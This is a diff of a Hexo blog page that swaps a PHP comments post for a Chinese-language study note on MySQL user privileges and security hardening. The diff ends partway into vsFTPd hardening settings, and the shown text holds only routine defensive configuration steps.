@@ -134,29 +134,123 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-PHP语法（十四）—注释" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-MySQL5数据库配置与管理（一）—数据库安全学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/25/PHP语法（十四）—注释/">PHP语法（十四） — 注释</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/02/01/MySQL5数据库配置与管理（一）—数据库安全学习笔记/">Mysql数据库（一） — 数据库安全</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/25/PHP语法（十四）—注释/" class="archive-article-date">
-  	<time datetime="2019-02-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-25</time>
+        <a href="/Knlvre.github-io/2019/02/01/MySQL5数据库配置与管理（一）—数据库安全学习笔记/" class="archive-article-date">
+  	<time datetime="2019-01-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>注释掉不想要输出的内容 或 用来解释说明</p>
-<p>比较常见，想必大家都知道，这里就不再具体写例子，简单说一下用法就好了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//	这是单行注释</span><br><span class="line">#	这也是单行注释</span><br><span class="line">/*	这是多行注释块，它可以横跨多行注释	*/</span><br></pre></td></tr></table></figure>
+        <h2 id="【Tip】"><a href="#【Tip】" class="headerlink" title="【Tip】"></a>【Tip】</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Grant：授予</span><br><span class="line">Privilege： 特权</span><br><span class="line">Revoke：废除</span><br><span class="line">Anonymous：匿名的</span><br><span class="line">Recurse：递归</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>​    （1）数据库系统分为内部安全性和外部安全性。</p>
+<p>​    （2）<strong>内部安全性</strong>关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均能简单地替代对应于那些数据库表的文件，那么确保控制客户通过网络访问的授权表设置正确，对此毫无意义。</p>
+<p>​    （3）<strong>外部安全性</strong>关心的是从外部通过网络连接服务器的客户的问题，既保护Mysql服务器免受来自通过网络对服务器的连接的攻击。必须设置Mysql授权表（grant table），使得他们不允许访问服务器管理的数据库内容，除非提供有效用户名和口令。</p>
+<hr>
+<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><h4 id="1-1-启动mysql服务"><a href="#1-1-启动mysql服务" class="headerlink" title="1.1 启动mysql服务"></a>1.1 启动mysql服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-1.png" alt="1"></p>
+<h4 id="1-2-进入mysql，并且创建一个新的数据库"><a href="#1-2-进入mysql，并且创建一个新的数据库" class="headerlink" title="1.2 进入mysql，并且创建一个新的数据库"></a>1.2 进入mysql，并且创建一个新的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">create database HSW;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-2.png" alt="1-2"></p>
+<h4 id="1-3-创建一个新用户，命名为：student"><a href="#1-3-创建一个新用户，命名为：student" class="headerlink" title="1.3 创建一个新用户，命名为：student"></a>1.3 创建一个新用户，命名为：student</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &apos;student&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-3.png" alt="1-3"></p>
+<h4 id="1-4-并给予相应数据库的权限"><a href="#1-4-并给予相应数据库的权限" class="headerlink" title="1.4 并给予相应数据库的权限"></a>1.4 并给予相应数据库的权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on HSW.* to &apos;student&apos;@&apos;localhost&apos; with grant option;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-4.png" alt="1-4"></p>
+<h4 id="1-5-刷新权限"><a href="#1-5-刷新权限" class="headerlink" title="1.5 刷新权限"></a>1.5 刷新权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-5.png" alt="1-5"></p>
+<h4 id="1-6-显示授权"><a href="#1-6-显示授权" class="headerlink" title="1.6 显示授权"></a>1.6 显示授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show grants;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-6.png" alt="1-6"></p>
+<h4 id="1-7-移除授权"><a href="#1-7-移除授权" class="headerlink" title="1.7 移除授权"></a>1.7 移除授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke delete on HSW.* from &apos;student&apos;@&apos;localhost&apos;；</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-7.png" alt="1-7"></p>
+<h4 id="1-8-为用户重命名"><a href="#1-8-为用户重命名" class="headerlink" title="1.8 为用户重命名"></a>1.8 为用户重命名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename user &apos;student&apos;@&apos;localhost&apos; to &apos;Knlvre&apos;@&apos;localhost&apos;；</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-8.png" alt="1-8"></p>
+<h4 id="1-9-为用户设置或更改密码"><a href="#1-9-为用户设置或更改密码" class="headerlink" title="1.9 为用户设置或更改密码"></a>1.9 为用户设置或更改密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD FOR &apos;Knlvre&apos;@&apos;localhost&apos; = PASSWORD(&apos;666666&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-9.png" alt="1-9"></p>
+<h4 id="1-10-删除数据库"><a href="#1-10-删除数据库" class="headerlink" title="1.10 删除数据库"></a>1.10 删除数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database HSW;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-10.png" alt="1-10"></p>
+<h4 id="1-11-删除用户"><a href="#1-11-删除用户" class="headerlink" title="1.11 删除用户"></a>1.11 删除用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user &apos;Knlvre&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/1-11.png" alt="1-11"></p>
+<hr>
+<h3 id="二、安全设置"><a href="#二、安全设置" class="headerlink" title="二、安全设置"></a>二、安全设置</h3><h4 id="2-1-启动mysql服务"><a href="#2-1-启动mysql服务" class="headerlink" title="2.1 启动mysql服务"></a>2.1 启动mysql服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-1.png" alt="2-1"></p>
+<h4 id="2-2-修改root用户的口令"><a href="#2-2-修改root用户的口令" class="headerlink" title="2.2 修改root用户的口令"></a>2.2 修改root用户的口令</h4><p>方法1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u root -p password 666</span><br></pre></td></tr></table></figure>
+<p>这时，系统会提醒你输入旧密码，如果没有就直接回车（这里是没有密码的）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-2.png" alt="2-2"></p>
+<p>方法2</p>
+<p>在方法1当中并没有进入mysql而去设置密码，本方法中需要先进入mysql，需要输入刚才设置的密码’666’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+<p>设置密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set password for root@localhost=password(&apos;666&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-3.png" alt="2-3"></p>
+<p>方法3</p>
+<p>最后一句<strong>flush privileges</strong>的意思是强制刷新内存授权表，否则用的还是缓存的口令，这是非法用户还可以用root用户及空口令登陆，直到重启Mysql服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set password=password(&apos;666&apos;) where user=&apos;root&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-4.png" alt="2-4"></p>
+<h4 id="2-3-删除默认的数据库和用户"><a href="#2-3-删除默认的数据库和用户" class="headerlink" title="2.3 删除默认的数据库和用户"></a>2.3 删除默认的数据库和用户</h4><p>我们的数据库是在本地，并且也只需要本地的php脚本对mysql进行读取。mysql初始化后会自动生成空用户和test库，这会对数据库构成威胁，我们全部删除。我们使用mysql客户端程序连接到本地的mysql服务器后出现如下提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drop database test;</span><br><span class="line">use mysql;</span><br><span class="line">delete from db;</span><br><span class="line">delete from user where not(host=&quot;localhost&quot; and user=&quot;root&quot;);</span><br><span class="line">flush pricileges;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-5.png" alt="2-5"></p>
+<h4 id="2-4-改变默认mysql管理员的名称"><a href="#2-4-改变默认mysql管理员的名称" class="headerlink" title="2.4 改变默认mysql管理员的名称"></a>2.4 改变默认mysql管理员的名称</h4><p>这个工作是可以选择的，根据个人习惯，因为默认的mysql的管理员名称是root，所以如果能够修改的话，能够防止一些脚本小子对系统的穷举。我们可以直接修改数据库，把root用户改为“admin”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set user=&quot;admin&quot; where user=&quot;root&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-6.png" alt="2-6"></p>
+<h4 id="2-5-提高本地安全性"><a href="#2-5-提高本地安全性" class="headerlink" title="2.5 提高本地安全性"></a>2.5 提高本地安全性</h4><p>主要是防止mysql对本地文件的存取，比如黑客通过mysql把/etc/passwd获取了，会对系统构成威胁。mysql对本地文件的存取是通过SQL语句来实现的，主要是通过Load DATA LOCAL INFILE来实现，我们能通过禁用该功能来防止黑客通过SQL注入等获取系统核心文件。禁用该功能必须在<strong>etc文件夹</strong>下的<strong>my.cnf文件</strong>的<strong>[mysqld]</strong>部分加上一个参数，如图所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-variable=local-infile=0</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-7.png" alt="2-7"></p>
+<h4 id="2-6-禁止远程链接mysql"><a href="#2-6-禁止远程链接mysql" class="headerlink" title="2.6 禁止远程链接mysql"></a>2.6 禁止远程链接mysql</h4><p>因为我们的mysql只需要本地的php脚本进行连接，所以我们无需开socket进行监听，那么我们完全可以关闭监听的功能，还是配置在<strong>etc文件夹</strong>下的<strong>my.cnf文件</strong>的<strong>[mysqld]</strong>部分添加内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-networking</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-8.png" alt="2-8"></p>
+<h4 id="2-7-控制数据库访问权限"><a href="#2-7-控制数据库访问权限" class="headerlink" title="2.7 控制数据库访问权限"></a>2.7 控制数据库访问权限</h4><p>对于使用php脚本来进行交互，最好建立一个用户只针对某个库拥有所有的操作权限，这样就很好避免了数据库用户名和密码被黑客查看后最小损失</p>
+<p>创建一个数据库为db1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database db1;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-9.png" alt="2-9"></p>
+<p>然后同时建立一个口令为adminab的用户test1能够访问该数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on db1.* to &apos;test1&apos;@&apos;localhost&apos; identified by &apos;adminab&apos; with grant option;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-10.png" alt="2-10"></p>
+<p>以上SQL是创建一个数据库db1，同时增加一个test1用户，对db1库有全部的操作权限，口令是adminab，但是它只能从本地连接mysql</p>
+<h4 id="2-8-限制一般用户浏览其他数据库"><a href="#2-8-限制一般用户浏览其他数据库" class="headerlink" title="2.8 限制一般用户浏览其他数据库"></a>2.8 限制一般用户浏览其他数据库</h4><p>如果有多个数据库，每个数据库有一个用户，那么必须限制用户浏览其他数据库内容，可以在启动mysql服务器时加上<strong>–skip-show-database</strong>启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart --skip-show-database</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/2-11.png" alt="2-11"></p>
+<hr>
+<h3 id="三、vsFTP安全设置"><a href="#三、vsFTP安全设置" class="headerlink" title="三、vsFTP安全设置"></a>三、vsFTP安全设置</h3><p><strong>vsFTPd</strong>是一款非常著名的<strong>ftp daemon</strong>程序，目前包括<strong>Redhat</strong>在内很多大公司都在使用，它是一款安全性很高的程序</p>
+<p>vsFTPd设置选项比较多，涉及方方面面，我们下面主要是针对安全方面进行设置</p>
+<p>目前我们的需求就是使用系统账户的同时也作为FTP账户来进行文件的管理，目前假设我只需要一个账户来更新我的网站，并且我不希望该账户能够登陆系统，比如网站目录是在<strong>/usr/www</strong>下面，那么我们创建一个用户<strong>ftp</strong>，它的主目录是<strong>/usr/www</strong>，并且它的shell是<strong>/usr/sbin/nologin</strong>，就是没有shell，防止该用户通过<strong>ssh</strong>等登陆到系统</p>
+<p>下面是针对vsftpd的配置文件<strong>vsftpd.conf文件</strong>的配置。</p>
+<h4 id="3-1-禁止匿名用户"><a href="#3-1-禁止匿名用户" class="headerlink" title="3.1 禁止匿名用户"></a>3.1 禁止匿名用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-1.png" alt="3-1"></p>
+<h4 id="3-2-允许本地用户登陆"><a href="#3-2-允许本地用户登陆" class="headerlink" title="3.2 允许本地用户登陆"></a>3.2 允许本地用户登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_enable=YES</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-2.png" alt="3-2"></p>
+<h4 id="3-3-只允许系统中的ftp用户或者某些指定的用户访问ftp，打开用户文件列表功能"><a href="#3-3-只允许系统中的ftp用户或者某些指定的用户访问ftp，打开用户文件列表功能" class="headerlink" title="3.3 只允许系统中的ftp用户或者某些指定的用户访问ftp，打开用户文件列表功能"></a>3.3 只允许系统中的ftp用户或者某些指定的用户访问ftp，打开用户文件列表功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userlist_enable=YES</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-3.png" alt="3-3"></p>
+<h4 id="3-4-只允许用户文件列表中的用户访问ftp-以及用户名文件列表路径"><a href="#3-4-只允许用户文件列表中的用户访问ftp-以及用户名文件列表路径" class="headerlink" title="3.4 只允许用户文件列表中的用户访问ftp:以及用户名文件列表路径"></a>3.4 只允许用户文件列表中的用户访问ftp:以及用户名文件列表路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userlist_deny=NO</span><br><span class="line">userlist_file=/etc/vsftpd.user_list</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-4.png" alt="3-4"></p>
+<h4 id="3-5-对vsftpd的用户使用pam认证"><a href="#3-5-对vsftpd的用户使用pam认证" class="headerlink" title="3.5 对vsftpd的用户使用pam认证"></a>3.5 对vsftpd的用户使用pam认证</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pam_service_name=vsftpd</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-5.png" alt="3-5"></p>
+<h4 id="3-6-需要指出vsftpd进行pam认证时所使用的pam配置文件名，默认值是vsftpd。把本地用户锁定在自己的主目录，防止转到其他目录"><a href="#3-6-需要指出vsftpd进行pam认证时所使用的pam配置文件名，默认值是vsftpd。把本地用户锁定在自己的主目录，防止转到其他目录" class="headerlink" title="3.6 需要指出vsftpd进行pam认证时所使用的pam配置文件名，默认值是vsftpd。把本地用户锁定在自己的主目录，防止转到其他目录"></a>3.6 需要指出vsftpd进行pam认证时所使用的pam配置文件名，默认值是vsftpd。把本地用户锁定在自己的主目录，防止转到其他目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chroot_local_users=NO</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-6.png" alt="3-6"></p>
+<h4 id="3-7-然后在-etc下创建vsftpd-chroot-list文件，里面把我们要限制的本地账户加进去，一行一个，我们加上ftp，防止它登录到系统"><a href="#3-7-然后在-etc下创建vsftpd-chroot-list文件，里面把我们要限制的本地账户加进去，一行一个，我们加上ftp，防止它登录到系统" class="headerlink" title="3.7  然后在/etc下创建vsftpd.chroot_list文件，里面把我们要限制的本地账户加进去，一行一个，我们加上ftp，防止它登录到系统"></a>3.7  然后在/etc下创建vsftpd.chroot_list文件，里面把我们要限制的本地账户加进去，一行一个，我们加上ftp，防止它登录到系统</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-7.png" alt="3-7"></p>
+<h4 id="3-8-隐藏文件真实的所有用户和组信息，防止黑客拿下ftp后查看更多系统用户信息"><a href="#3-8-隐藏文件真实的所有用户和组信息，防止黑客拿下ftp后查看更多系统用户信息" class="headerlink" title="3.8 隐藏文件真实的所有用户和组信息，防止黑客拿下ftp后查看更多系统用户信息"></a>3.8 隐藏文件真实的所有用户和组信息，防止黑客拿下ftp后查看更多系统用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hide_ids=YES</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-8.png" alt="3-8"></p>
+<h4 id="3-9-取消ls-R命令，节省资源，因为使用该命令，在文件列表很多的时候将浪费大量系统资源"><a href="#3-9-取消ls-R命令，节省资源，因为使用该命令，在文件列表很多的时候将浪费大量系统资源" class="headerlink" title="3.9 取消ls -R命令，节省资源，因为使用该命令，在文件列表很多的时候将浪费大量系统资源"></a>3.9 取消ls -R命令，节省资源，因为使用该命令，在文件列表很多的时候将浪费大量系统资源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls_recurse_enable=NO</span><br><span class="line">local_umask=022</span><br><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure>
